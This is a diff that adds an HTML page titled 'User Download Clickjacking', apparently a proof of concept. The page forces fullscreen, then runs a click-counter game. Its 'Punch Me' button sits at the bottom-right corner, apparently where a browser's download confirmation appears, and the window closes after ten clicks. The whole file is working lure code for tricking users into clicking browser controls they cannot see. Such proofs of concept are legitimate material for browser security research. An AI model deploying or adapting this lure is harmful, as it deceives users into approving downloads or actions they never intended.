@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Download Clickjacking</title>
+    <style>
+        .button-container {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: flex-end;
+            align-items: flex-end;
+        }
+
+        .floating-button {
+            position: absolute;
+            bottom: 6%;
+            right: 2%;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 8px 18px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+        }
+        .counter-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <button id="full">Click Me</button>
+    <h2 id="header" style="position: fixed;">Make Your Higher Counter Score</h2>
+    <div class="counter-container">
+        <h3>Counter</h3>
+        <h4 id="text"></h4>
+    </div>
+    <div class="button-container">
+        <button class="floating-button" id="klik">Punch Me</button>
+    </div>
+
+<script>
+    const klik = document.getElementById('klik')
+    const full = document.getElementById('full')
+    const text = document.getElementById('text')
+    const elem = document.documentElement;
+    var header = document.getElementById('header');
+    var counterContainer = document.querySelector('.counter-container');
+    var buttonContainer = document.querySelector('.button-container');
+    let count = 0;
+
+    window.onload = () => {
+        header.style.display = 'none';
+        counterContainer.style.display = 'none';
+        buttonContainer.style.display = 'none';
+        text.innerText = count
+    }
+
+    full.addEventListener('click', (event) => {
+        if (!document.fullscreenElement) {
+            elem.requestFullscreen()
+            header.style.display = 'block';
+            counterContainer.style.display = 'block';
+            buttonContainer.style.display = 'block';
+        } else {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            }
+        }
+    })
+
+    klik.addEventListener('click', (event) => {
+        count++;
+
+        text.innerText = count
+
+        if(count == 10){
+            window.close()
+        }
+    })
+</script>
+
+</body>
+</html>
